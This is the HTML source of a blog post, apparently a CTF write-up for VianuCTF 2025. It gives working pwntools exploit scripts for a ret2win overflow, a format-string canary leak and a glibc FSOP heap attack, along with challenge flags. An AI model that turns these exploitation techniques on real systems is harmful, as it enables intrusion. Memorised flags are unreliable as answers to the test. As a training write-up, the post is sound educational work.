@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>VianuCTF 2025 | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="CyberEdu, pwn, buffer-overflow, Ret2libc, JOP">
+<meta name="description" content="Introduction
+This is my writeup for the challenges I solved during the VianuCTF 2025 edition, big thank you to the challenge writers, organizers and everyone else involved in this! Was a fun ctf overall, unluckily overlapping with the math finals simulation, so I only had about three hours left to try solving some challenges.
+Enough talking, here is what I solved:
+Christmas PIE - pwn
+
+As spoiled by the title, we&rsquo;re dealing with a 64-bit PIE, and we get the address of main upon running the binary.">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/vianuctf-writeup/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/vianuctf-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/vianuctf-writeup/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="VianuCTF 2025">
+  <meta property="og:description" content="Introduction This is my writeup for the challenges I solved during the VianuCTF 2025 edition, big thank you to the challenge writers, organizers and everyone else involved in this! Was a fun ctf overall, unluckily overlapping with the math finals simulation, so I only had about three hours left to try solving some challenges.
+Enough talking, here is what I solved:
+Christmas PIE - pwn As spoiled by the title, we’re dealing with a 64-bit PIE, and we get the address of main upon running the binary.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-16T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-12-16T00:00:00+00:00">
+    <meta property="article:tag" content="CyberEdu">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Buffer-Overflow">
+    <meta property="article:tag" content="Ret2libc">
+    <meta property="article:tag" content="JOP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="VianuCTF 2025">
+<meta name="twitter:description" content="Introduction
+This is my writeup for the challenges I solved during the VianuCTF 2025 edition, big thank you to the challenge writers, organizers and everyone else involved in this! Was a fun ctf overall, unluckily overlapping with the math finals simulation, so I only had about three hours left to try solving some challenges.
+Enough talking, here is what I solved:
+Christmas PIE - pwn
+
+As spoiled by the title, we&rsquo;re dealing with a 64-bit PIE, and we get the address of main upon running the binary.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "VianuCTF 2025",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/vianuctf-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "VianuCTF 2025",
+  "name": "VianuCTF 2025",
+  "description": "Introduction This is my writeup for the challenges I solved during the VianuCTF 2025 edition, big thank you to the challenge writers, organizers and everyone else involved in this! Was a fun ctf overall, unluckily overlapping with the math finals simulation, so I only had about three hours left to try solving some challenges.\nEnough talking, here is what I solved:\nChristmas PIE - pwn As spoiled by the title, we\u0026rsquo;re dealing with a 64-bit PIE, and we get the address of main upon running the binary.\n",
+  "keywords": [
+    "CyberEdu", "pwn", "buffer-overflow", "Ret2libc", "JOP"
+  ],
+  "articleBody": "Introduction This is my writeup for the challenges I solved during the VianuCTF 2025 edition, big thank you to the challenge writers, organizers and everyone else involved in this! Was a fun ctf overall, unluckily overlapping with the math finals simulation, so I only had about three hours left to try solving some challenges.\nEnough talking, here is what I solved:\nChristmas PIE - pwn As spoiled by the title, we’re dealing with a 64-bit PIE, and we get the address of main upon running the binary.\nTaking a look at the decompiled code, first thing we see is a buffer overflow and a win function. So classic ret2win. We can parse main, calculate the address of win and overwrite the return with win.\nThe final script looks like this:\nfrom pwn import * elf = ELF('/home/kali/Downloads/christmas_pie') p=elf.process() p=remote('34.179.139.43', 30353) p.recvuntil(b': ') main = int(p.recvline().strip(), 16) print(hex(main)) #base + 0x12CF = main #base + 0x11FA = win #win = main - 0x12CF + 0x11FA #win = main - 0xD5 win = main-0xD5 #buf payload = b'A' * 80 #rbp payload += b'\\x90'*8 payload += p64(win) p.sendline(payload) p.interactive() The flag: CTF{CHR1STM4S_P13_G1V3S_Y0U_SH3LL}\nSanta’s little pwner - pwn Just like the challenge before it, we’re working with a 64-bit PIE, except with a little more restrictions this time. Also similarly to Christmas PIE, we have a win function inside of our binary.\nIn this challenge, we get to name two elves, whose names are plainly printed back to us, so immediately, this means format string vulnerability.\nThe restrictions I was talking about are - as you might see in the v4 = __readfsqword(0x28u); - a canary! But since we have a fmtstr vuln we can find out what the canary is and be careful not to overwrite it.\nAnd since we’re working with PIE, we also need to leak a function inside our binary to get win. This is to use the buffer overflow in s to redirect to win. Since this function is called twice, the first time it’s called, we can leak our addresses and the second time form our payload. I found the canary at %43$p on the stack, and a binary address at an 0x43 offset from win at %21$p.\nThe final script:\nfrom pwn import * elf = ELF('/home/kali/Downloads/santas_little_pwner') p=elf.process() p=remote('34.89.226.167', 30593) p.recvuntil(b': ') p.sendline(b'%43$p %21$p') #get canary + main canary = int(p.recvn(18), 16) p.recvuntil(b' ') main_leak = int(p.recvn(14), 16) win = main_leak + 0x43 print(hex(canary)) print(hex(win)) p.recvuntil(b': ') payload = b'A'*72 + p64(canary) + b'B'*8 + p64(win) p.sendline(payload) p.interactive() The flag: CTF{wh0_15_4_g00d_b0y_pwn3r}\nDSN - pwn Sadly I didn’t get to finish this in time for the ctf, but I though I could make a writeup for this anyways, as it had zero solves. So keep in mind, the script isn’t mine, but I will do my best to explain everything that’s happening. TLDR, this is FSOP.\nAnyways, this challenge is a bit more complicated than the other ones, and also heap, so twice as bad. So let’s take a look at it step by step. First, we’re dealing with every restriction possible, including full RelRO, except canary. And the glibc version for this chall is 2.36, keep that in mind.\nWe have an app folder, with a chall and flag.txt inside, and a lib folder with a libc.so.6 and a ld.so.\nIn our main, we have, of course, a menu, and five options to choose from: establish_link, terminate_link, download_telemetry, upload_commands and exit.\nUsing a global array, in this case marked as qword_5080, we can maintain two probes like so: [ probe0_buf | probe0_size | probe1_buf | probe1_size ].\nIn establish_link, we essentially allocate a heap chunk for a probe. We’re given a size range (1280 to 4096), and the pointer and size are stored in qword_5080.\nIn terminate_link, we simply free the heap chunk, clear the pointer, but don’t check whether the buffer is still in use by the signal handler (more on that later).\nIn download_telemetry, the only important line is puts(qword_5080[id]).\nIn upload_commands, things start to get a little more interesting. We can translate this into something like:\nint upload_commands() { Probe ID read(0, staging, size) active_buf = probe_buf active_len = bytes_read alarm(3) } This active_buf and active_len are qword_5068 and qword_5060. This is because read returns the number of bytes read. And in this case active_buf points directly to the probe’s heap buffer.\nThe signal I mentioned previously is triggered at the end of this alarm, and executes:\nmemcpy(active_buf, staging, active_len) Where we control the length. So obviously that alarm is completely out of place; This function is going to be our main issue for this challenge.\nWe also have a handler function, which looks like so:\nvoid handler() { if (active_buf) memcpy(active_buf, staging, active_len); active_buf = NULL; } And this runs asynchronously after alarm(3). So this writes even after the buffer was freed, because it doesn’t really check anything properly. So this means we have an async UAF primitive at hand.\nSo we’re looking at a couple of vulnerabilities: this async UAF (Use-After-Free) which is more of a Write-After Free:\nupload_commands() to set active_buf\nterminate_link to free it\nhandler to write to freed memory\nThen we also have a heap overflow, which was apparently unintended but it exists anyways, since we can make that active_len pretty big.\nSince, as previously mentioned, we’re dealing with glibc 2.36, hooks are removed and RelRO is full so we can’t overwrite GOT, we have to do something else.\nThere is something we can do, though, called glibc FILE structure exploitation. Here is a great in-depth resource that talks about it, but I’ll try to explain it broadly.\nFirst, what is a glibc FILE? In C, internally, it looks something like:\nstruct _IO_FILE_plus { _IO_FILE file; const struct _IO_jump_t *vtable; }; _IO_FILE is the state, so the buffer pointers, and the vtable is function pointers for I/O operations.\nSo the vtable is a structure of function pointers that define how this stream should behave when I/O happens. And the _IO_FILE contains the data.\nLuckily, glibc keeps a global linked list of all the open FILEs, _IO_list_all. This includes stdin, stdout, and every open fopen() file.\nWhen our program exits or flushes streams, glibc runs _IO_flush_all_lockp().\nThis then does\nfor each file in _IO_list_all: file-\u003evtable-\u003eoverflow(file, EOF) Or _IO_list_all → stdout → stderr → stdin → ....\nSo what we want to do, is insert a fake FILE into _IO_list_all and control its vtable to call a function pointer we can control. Essentially we overwrite a ‘FILE’ pointer (anything opened by fopen()) to our own forged structure. (This is, obviously, patched in newer libc versions).\nProblem is we can’t make a fake vtable, because glibc verifies it and aborts when something’s fishy.\nSo in file-\u003evtable-\u003eoverflow(file, EOF); our exploit is going to look like:\nfile is our fake _IO_FILE\nvtable is a legitimate vtable that already exists like _IO_wfile_jumps\noverflow() to a glibc function that reads from file.\nWhat we want to jump to is a one_gadget, so a piece of shellcode that would just take care of everything and get us a shell.\nAlright, now that that’s out of the way, let’s start actually working on our exploit. First, we want to leak libc, and we’re going to have to mess around with allocations for that.\nSo first let’s set it up.\na = 0, b = 1 alloc(a, 0x558) alloc(b, 0x500) Because both these sizes are larger than the tcache max, they would both go into the unsorted bin, and they don’t get merged because of the different sizes. So now the heap looks like [ chunk A (0x558) ][ chunk B (0x500) ][ top chunk ].\nNow, we need to leak a pointer into main_arena to compute the libc base.\nfree(a) alloc(a, 0x700) This frees our a, and as previously said, it goes into the unsorted bin, and it’s fd and bk pointers are set to main_arena + 0x60. After allocating a bigger size, glibc will reuse it, and leftover metadata will still contain some libc pointers.\nBasically the new allocated chunk looks like so:\n+0x00 main_arena+0x60\n+0x08 main_arena+0x60\nmain-arena is inside libc so any pointer to it is a libc pointer. Then we can use upload_telemetry to change one byte into something like an A and then download_telemetry to output the actual libc address.\nWe have libc, now we need to get the heap base. Similarly, we overwrite using upload_telemetry so that our chunk looks like this:\n+0x00 AAAAAAAA\n+0x08 AAAAAAAA\n+0x10 heap pointer\nThen we can get it using download_telemetry.\nThe script up to now looks like this, first the helper functions:\ndef alloc(idx, size): io.sendlineafter(b'\u003e ', b'1') io.sendlineafter(b'Probe ID: ', str(idx).encode()) io.sendlineafter(b'Buffer size: ', str(size).encode()) def free(idx): io.sendlineafter(b'\u003e ', b'2') io.sendlineafter(b'Probe ID: ', str(idx).encode()) def read_buf(idx): io.sendlineafter(b'\u003e ', b'3') io.sendlineafter(b'Probe ID: ', str(idx).encode()) return io.recvline() def write_buf(idx, data): io.sendlineafter(b'\u003e ', b'4') io.sendlineafter(b'Probe ID: ', str(idx).encode()) io.sendafter(b'Data: ', data) def wait_for_write(): io.recvuntil(b\"received!\\n\") io.sendline(b'0') Then the leaks:\na, b = 0, 1 alloc(a, 0x558) alloc(b, 0x500) free(a) alloc(a, 0x700) free(a) alloc(a, 0x558) write_buf(a, b\"A\") wait_for_write() # Leak unsorted bin fd → main_arena leak = read_buf(a).strip() libc_leak = u64(leak.ljust(8, b\"\\x00\")) libc.address = libc_leak - 0x1d2141 log.success(f\"libc base @ {hex(libc.address)}\") #heap # Overwrite first 16 bytes to reach heap pointer write_buf(a, b\"A\"*16) wait_for_write() leak = read_buf(a).strip() heap_leak = u64(leak[16:].ljust(8, b\"\\x00\")) heap_base = heap_leak - 0x290 log.success(f\"heap base @ {hex(heap_base)}\") Now the complicated part. We need to build a fake FILE structure. Luckily pwntools has this tool called FileStructure that helps us build a valid _IO_FILE_plus layout. We place it inside of the heap, where we control memory. Then, as I said before, we recycle a preexisting vtable.\nch_addr = heap + 0x290 fs = FileStructure(0) fs.vtable = libc.sym['_IO_wfile_jumps'] Next, the one_gadget. Using the libc.so.6 file we get:\nWe can add this along with _lock, which is required for safety, importantly just writeable memory that won’t crash. Similarly, _wide_data.\nfs.markers = libc.address + 0xd3361 # one_gadget fs._lock = ch_addr + 0x10 fs._wide_data = ch_addr - 0x18 #next some padding fs.unknown2 = ( p64(0) * 4 + p64(ch_addr - 0x8) + p64(0) ) Next we overwrite _IO_list_all by freeing a corrupted FILE chunk.\nchunk[0x18:0x20] = p64(libc.sym['_IO_list_all'] - 0x20) fake_chunk-\u003efd = \u0026_IO_list_all - 0x20 fd-\u003ebk = bk; _IO_list_all = fake_FILE; Upon freeing this chunk with another free(a), glibc is going to call _IO_flush_all_lockp.\nThen we need to free the second probe to force glibc to walk the FILE list:\nfree(b) alloc(b, 0x500) And finally, triggering another I/O operation causes glibc to flush streams:\nwrite(a, b'x') io.sendlineafter(b'\u003e ', b'4') io.sendlineafter(b': ', str(b).encode()) After everything is said and done, our one_gadget is going to get triggered and grant us a shell.\nSo the end of the script:\nchunk = bytearray(bytes(fs)[0x10:].ljust(0x558, b'\\x00')) chunk[0x18:0x20] = p64(libc.sym['_IO_list_all'] - 0x20) #→ _IO_list_all = fake_FILE chunk[0x528:0x540] = p64(0x31) + p64(heap + 0x7c0) * 2 #prev_size = 0x31 #size = 0x31 #fd = heap+0x7c0 #bk = heap+0x7c0 #this makes the chunk look like a valid smallbin chunk pointing to controlled heap memory #just make it look normal chunk[0x550:0x558] = p64(0x30) #another anticrash thing chunk = bytes(chunk) write(a, chunk) free(a) ##here, _IO_list_all = fake_FILE alloc(a, 0x700) wait_for_write() #heap state stabilization free(b) alloc(b, 0x500) #trigger a free that runs our payload write(a, b'x') io.sendlineafter(b'\u003e ', b'4') io.sendlineafter(b': ', str(b).encode()) io.interactive() And here is proof that it actually works:\nAgain, credits to Iacob Razvan Mihai for coming up with this challenge and for the script.\nSanta - misc This was an easy challenge, consisting of a Santa AI chatbot, with the description Did santa give you a present this year, you little helper? (little helper in bold). So I thought they must’ve bolded that for a reason, and upon entering the phrase little helper as input for the chatbot, we get the flag.\nThe flag: Vianu_CTF(s4nt4_g4ve_you_a_pr3s3n7_T00?)\nC it’s Still a Thing in 2025 - Reverse Engineering If we open the binary with IDA, we immediately get the flag as plaintext.\nThe flag: CTF{b2d7f24e833051d5fc296d4a747281e9d155ecfb636b983cfd70b51ed9b45a32}\nFind It - OSINT The description for this challenge was Find the hidden secret in a photo uploaded by N0th1ngUs3r on a platform that starts with “F”.. The platform for this was Flickr, some image sharing forum, and after finding the user, we find QR code that they posted, which leads to the flag upon scanning.\nThe flag: CTF{fd3d13ac301958102d1e1038d6a6b0b2e743561b9e31446f42b1d2f32aabeb06}\n",
+  "wordCount" : "2049",
+  "inLanguage": "en",
+  "datePublished": "2025-12-16T00:00:00Z",
+  "dateModified": "2025-12-16T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/vianuctf-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      VianuCTF 2025
+    </h1>
+    <div class="post-meta"><span title='2025-12-16 00:00:00 +0000 UTC'>December 16, 2025</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#introduction" aria-label="Introduction">Introduction</a></li>
+                <li>
+                    <a href="#christmas-pie---pwn" aria-label="Christmas PIE - pwn">Christmas PIE - pwn</a></li>
+                <li>
+                    <a href="#santas-little-pwner---pwn" aria-label="Santa&rsquo;s little pwner - pwn">Santa&rsquo;s little pwner - pwn</a></li>
+                <li>
+                    <a href="#dsn---pwn" aria-label="DSN - pwn">DSN - pwn</a></li>
+                <li>
+                    <a href="#santa---misc" aria-label="Santa - misc">Santa - misc</a></li>
+                <li>
+                    <a href="#c-its-still-a-thing-in-2025---reverse-engineering" aria-label="C it&rsquo;s Still a Thing in 2025 - Reverse Engineering">C it&rsquo;s Still a Thing in 2025 - Reverse Engineering</a></li>
+                <li>
+                    <a href="#find-it---osint" aria-label="Find It - OSINT">Find It - OSINT</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
+<p>This is my writeup for the challenges I solved during the VianuCTF 2025 edition, big thank you to the challenge writers, organizers and everyone else involved in this! Was a fun ctf overall, unluckily overlapping with the math finals simulation, so I only had about three hours left to try solving some challenges.</p>
+<p>Enough talking, here is what I solved:</p>
+<h2 id="christmas-pie---pwn">Christmas PIE - pwn<a hidden class="anchor" aria-hidden="true" href="#christmas-pie---pwn">#</a></h2>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/vianuctf-writeup/pic1.png#center"></p>
+<p>As spoiled by the title, we&rsquo;re dealing with a 64-bit PIE, and we get the address of <code>main</code> upon running the binary.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/vianuctf-writeup/pic2.png#center"></p>
+<p>Taking a look at the decompiled code, first thing we see is a buffer overflow and a win function. So classic ret2win. We can parse <code>main</code>, calculate the address of <code>win</code> and overwrite the return with <code>win</code>.</p>
+<p>The final script looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/home/kali/Downloads/christmas_pie&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>elf<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;34.179.139.43&#39;</span>, <span style="color:#ae81ff">30353</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>print(hex(main))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#base + 0x12CF = main</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#base + 0x11FA = win</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#win = main - 0x12CF + 0x11FA</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#win = main - 0xD5</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>win <span style="color:#f92672">=</span> main<span style="color:#f92672">-</span><span style="color:#ae81ff">0xD5</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#buf</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#rbp</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(win)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>The flag: CTF{CHR1STM4S_P13_G1V3S_Y0U_SH3LL}</p>
+<hr>
+<h2 id="santas-little-pwner---pwn">Santa&rsquo;s little pwner - pwn<a hidden class="anchor" aria-hidden="true" href="#santas-little-pwner---pwn">#</a></h2>
+<p>Just like the challenge before it, we&rsquo;re working with a 64-bit PIE, except with a little more restrictions this time. Also similarly to <strong>Christmas PIE</strong>, we have a <code>win</code> function inside of our binary.</p>
+<p>In this challenge, we get to name two elves, whose names are plainly printed back to us, so immediately, this means format string vulnerability.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/vianuctf-writeup/pic3.png#center"></p>
+<p>The restrictions I was talking about are - as you might see in the <code>v4 = __readfsqword(0x28u);</code> - a canary! But since we have a fmtstr vuln we can find out what the canary is and be careful not to overwrite it.</p>
+<p>And since we&rsquo;re working with PIE, we also need to leak a function inside our binary to get <code>win</code>. This is to use the buffer overflow in <code>s</code> to redirect to <code>win</code>. Since this function is called twice, the first time it&rsquo;s called, we can leak our addresses and the second time form our payload. I found the canary at <code>%43$p</code> on the stack, and a binary address at an <code>0x43</code> offset from <code>win</code> at <code>%21$p</code>.</p>
+<p>The final script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/home/kali/Downloads/santas_little_pwner&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>elf<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;34.89.226.167&#39;</span>, <span style="color:#ae81ff">30593</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%43$p %21$p&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#get canary  + main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvn(<span style="color:#ae81ff">18</span>), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span>)
+</span></span><span style="display:flex;"><span>main_leak <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvn(<span style="color:#ae81ff">14</span>), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>win <span style="color:#f92672">=</span> main_leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x43</span>
+</span></span><span style="display:flex;"><span>print(hex(canary))
+</span></span><span style="display:flex;"><span>print(hex(win))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">72</span> <span style="color:#f92672">+</span> p64(canary) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(win)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>The flag: CTF{wh0_15_4_g00d_b0y_pwn3r}</p>
+<hr>
+<h2 id="dsn---pwn">DSN - pwn<a hidden class="anchor" aria-hidden="true" href="#dsn---pwn">#</a></h2>
+<p>Sadly I didn&rsquo;t get to finish this in time for the ctf, but I though I could make a writeup for this anyways, as it had zero solves. So keep in mind, the script isn&rsquo;t mine, but I will do my best to explain everything that&rsquo;s happening. TLDR, this is <a href="https://dangokyo.wordpress.com/2018/01/01/advanced-heap-exploitation-file-stream-oriented-programming/">FSOP</a>.</p>
+<p>Anyways, this challenge is a bit more complicated than the other ones, and also <em>heap</em>, so twice as bad. So let&rsquo;s take a look at it step by step.
+First, we&rsquo;re dealing with every restriction possible, including full RelRO, except canary. And the <code>glibc</code> version for this chall is <code>2.36</code>, keep that in mind.</p>
+<p>We have an app folder, with a <code>chall</code> and <code>flag.txt</code> inside, and a lib folder with a <code>libc.so.6</code> and a <code>ld.so</code>.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/vianuctf-writeup/pic4.png#center"></p>
